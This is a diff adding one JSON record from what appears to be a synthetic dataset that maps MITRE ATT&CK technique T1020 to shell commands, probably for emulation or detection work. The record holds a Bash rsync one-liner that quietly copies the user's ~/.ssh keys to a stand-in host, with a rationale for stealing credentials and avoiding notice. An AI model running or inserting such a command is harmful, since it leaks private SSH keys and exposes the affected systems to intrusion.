@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --update $HOME/.ssh/ rsync://sync.example.net/archive/$HOSTNAME/.ssh/",
+  "explanation": "Transfers SSH key material to an rsync daemon endpoint using incremental sync and quiet mode, leveraging rsync\u2019s native protocol for automated exfiltration (T1020).",
+  "rationale_steps": [
+    "Target sensitive credentials (~/.ssh).",
+    "Use rsync protocol to a preconfigured module/path.",
+    "Apply --update to skip previously exfiltrated files.",
+    "Run quietly to suppress terminal output."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-97c0a830",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
